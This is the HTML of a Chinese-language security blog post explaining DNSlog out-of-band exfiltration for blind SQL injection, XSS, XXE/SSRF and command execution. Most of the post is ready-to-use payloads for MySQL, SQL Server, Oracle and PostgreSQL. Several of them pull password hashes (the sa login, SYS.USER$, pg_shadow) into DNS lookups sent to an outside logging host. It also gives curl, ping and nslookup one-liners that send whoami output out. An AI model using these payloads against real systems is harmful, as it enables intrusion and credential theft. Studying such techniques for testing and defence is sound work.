@@ -1,0 +1,289 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DNSlog | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DNSlog | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="巧用DNSlog实现无回显注入
+0x01  DNSLOG回显原理
+测试一些网站的时候，一些注入都是无回显的，我们可以写脚本来进行盲注，但有些网站会ban掉我们的ip，这样我们可以通过设置ip代理池解决，
+但是盲注往往效率很低，所以产生了DN..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              DNSlog
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h3 id="巧用dnslog实现无回显注入">巧用DNSlog实现无回显注入</h3>
+<h4 id="0x01-dnslog回显原理">0x01  DNSLOG回显原理</h4>
+<p>测试一些网站的时候，一些注入都是无回显的，我们可以写脚本来进行盲注，但有些网站会<code>ban</code>掉我们的<code>ip</code>，这样我们可以通过设置<code>ip</code>代理池解决，</p>
+<p>但是盲注往往效率很低，所以产生了<code>DNSlog</code>注入。具体原理如下。</p>
+<p>首先需要有一个可以配置的域名，比如：<code>ceye.io</code>，然后通过代理商设置域名 <code>ceye.io</code> 的 <code>nameserver</code> 为自己的服务器 <code>A</code>，然后再服务器 <code>A</code> 上配置好 <code>DNS</code> <code>Server</code>，这样以来所有 <code>ceye.io</code> 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。</p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2020/10/28/w7MFhlADNouxZHc.png" alt="1298490-20171216200508702-1121770116.png" loading="lazy"></figure>
+<p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息<br>
+简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p>
+<h4 id="0x02-dnslog回显demo">0x02  DNSLOG回显Demo</h4>
+<p>这样说原理很抽象，下面通过实际例子看下。有时候<code>http://ceye.io</code>访问太慢，推荐使用<code>http://www.dnslog.cn</code>平台或者<code>t00ls</code>的<code>DNSLOG</code>平台。下面以<code>http://ceye.io</code> 为例子。</p>
+<p><code>http://ceye.io</code> 这是一个免费的记录<code>dnslog</code>的平台，我们注册后到控制面板会给你一个二级域名：<code>xxx.ceye.io</code>,当我们把注入信息放到三级域名那里，后台的日志会记录下来。</p>
+<h4 id="0x03-sql盲注">0x03 SQL盲注</h4>
+<p>就以<code>sql</code>盲注为例，后端数据库用的<code>mysql</code>数据库，说一下用<code>dnslog</code>回显只能用于<code>windows</code>系统，原理就是<code>'\\\\'</code>代表Microsoft <code>Windows</code>通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。双斜杠表示网络资源路径多加两个\就是转义了反斜杠。深入理解下DNSlog注入过程：</p>
+<p>通过<code>DNSlog</code>盲注需要用的<code>load_file()</code>函数，所以一般得是<code>root</code>权限。<code>show variables like '%secure%'</code>;查看<code>load_file()</code>可以读取的磁盘。</p>
+<ol>
+<li>
+<p>当<code>secure_file_priv</code>为空，就可以读取磁盘的目录。</p>
+</li>
+<li>
+<p>当<code>secure_file_priv</code>为<code>G:\</code>，就可以读取G盘的文件。</p>
+</li>
+<li>
+<p>当<code>secure_file_priv</code>为<code>null</code>，<code>load_file</code>就不能加载文件。</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2020/10/28/4rnS9Ujq1JPha8I.png" alt="1298490-20171216202407296-81048198.png" loading="lazy"></figure>
+<p>通过设置<code>my.ini</code>来配置。<code>secure_file_priv=&quot;&quot;</code>就是可以<code>load_flie</code>任意磁盘的文件。<br>
+<img src="https://i.loli.net/2020/10/28/oagHwmpPfKzZ9sX.png" alt="1298490-20171216202748999-1910455572.png" loading="lazy"></p>
+<p>在mysql命令行执行：select load_file('\\afanti.xxxx.ceye.io\aaa');其中afanti就是要注入的查询语句</p>
+<p>查看平台，dnsLog被记录下来。</p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2020/10/28/LhW1vPY8CbAFocj.png" alt="1298490-20171216203651983-114953403.png" loading="lazy"></figure>
+<p><code>load_file()</code>函数可以通过dns解析请求。</p>
+<p>以sql-labs第五关：</p>
+<pre><code>payload：' and if((select load_file(concat('\\\\',(select database()),'.xxxxx.ceye.io\\abc'))),1,0)-- -+
+</code></pre>
+<p>执行的<code>sql</code>语句：</p>
+<pre><code>SELECT * FROM users WHERE id='1' and if((select load_file(concat('\\\\',(select database()),'.xxxxx.ceye.io\\abc'))),1,0)
+</code></pre>
+<p>查看<code>dnslog</code>日志，发现<code>security</code>数据库被查询出来：</p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2020/10/28/xuVHor2RN5QM1Gf.png" alt="1298490-20171216204221827-1146117172.png" loading="lazy"></figure>
+<h5 id="sql-server-payload">SQL SERVER Payload</h5>
+<pre><code>DECLARE @host varchar(1024);
+SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa') +'.ip.port.b182oj.ceye.io';
+EXEC('master..xp_dirtree&quot;\\'+@host+'\foobar$&quot;');
+</code></pre>
+<h5 id="oracle-payload">Oracle Payload</h5>
+<pre><code>SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');
+SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;
+SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;
+SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;
+SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL;
+</code></pre>
+<h5 id="postgresql-payload">PostgreSQL Payload</h5>
+<pre><code>DROP TABLE IF EXISTS table_output;
+CREATE TABLE table_output(content text);
+CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $ DECLARE exec_cmd TEXT;
+DECLARE query_result TEXT;
+BEGIN SELECT INTO query_result (SELECT passwd FROM pg_shadow WHERE usename='postgres');
+exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';
+EXECUTE exec_cmd;
+END;
+$ LANGUAGE plpgsql SECURITY DEFINER;
+SELECT temp_function();
+</code></pre>
+<h5 id="0x04-xss无回显">0x04 XSS（无回显）</h5>
+<p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
+<p><code>payload:&gt;&lt;img src=http://xss.xxxx.ceye.io/aaa&gt;</code>让<code>src</code>请求我们的<code>dnslog</code>平台.<br>
+<img src="https://i.loli.net/2020/10/28/edhTXABE9HjyODq.png" alt="1298490-20171216205320671-1626266465.png" loading="lazy"></p>
+<h5 id="0x05-ssrf无回显">0x05 SSRF(无回显)</h5>
+<p><strong>payload</strong></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM &quot;http://ip.port.b182oj.ceye.io/xxe_test&quot;&gt;
+%remote;]&gt;
+&lt;/root&gt;
+</code></pre>
+<h5 id="0x06-命令执行无回显">0x06 命令执行（无回显）</h5>
+<p>当 <code>ping</code> 一个域名时会对其进行一个递归 <code>DNS</code> 查询的过程，这个时候就能在后端获取到 <code>DNS</code> 的查询请求，当命令真正被执行且平台收到回显时就能说明漏洞确实存在。</p>
+<pre><code>linux
+
+curl http://haha.xxx.ceye.io/`whoami`
+ping `whoami`.xxxx.ceye.io
+</code></pre>
+<pre><code>Windows
+
+ping %USERNAME%.xxx.ceye.io
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2020/10/28/Zd7VsPzkWTiKISq.png" alt="1298490-20171216210336530-50112226.png" loading="lazy"></figure>
+<pre><code>cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot; del temp*
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2020/10/28/mX6vhrkKpVzbHtB.png" alt="1298490-20190523171204826-109608704.png" loading="lazy"></figure>
+<p>其他的在这个平台上有一些payload，参考这个链接：http://ceye.io/payloads</p>
+<p>参考链接：</p>
+<p>http://foreversong.cn/archives/861</p>
+<p>https://bbs.ichunqiu.com/thread-22002-1-1.html</p>
+<p>http://blog.knownsec.com/2016/06/how-to-scan-and-check-vulnerabilities/</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E5%B7%A7%E7%94%A8dnslog%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5">巧用DNSlog实现无回显注入</a>
+<ul>
+<li><a href="#0x01-dnslog%E5%9B%9E%E6%98%BE%E5%8E%9F%E7%90%86">0x01  DNSLOG回显原理</a></li>
+<li><a href="#0x02-dnslog%E5%9B%9E%E6%98%BEdemo">0x02  DNSLOG回显Demo</a></li>
+<li><a href="#0x03-sql%E7%9B%B2%E6%B3%A8">0x03 SQL盲注</a>
+<ul>
+<li><a href="#sql-server-payload">SQL SERVER Payload</a></li>
+<li><a href="#oracle-payload">Oracle Payload</a></li>
+<li><a href="#postgresql-payload">PostgreSQL Payload</a></li>
+<li><a href="#0x04-xss%E6%97%A0%E5%9B%9E%E6%98%BE">0x04 XSS（无回显）</a></li>
+<li><a href="#0x05-ssrf%E6%97%A0%E5%9B%9E%E6%98%BE">0x05 SSRF(无回显)</a></li>
+<li><a href="#0x06-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE">0x06 命令执行（无回显）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/fan-dan-shell-zi-shi/">
+              <h3 class="post-title">
+                反弹shell姿势
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
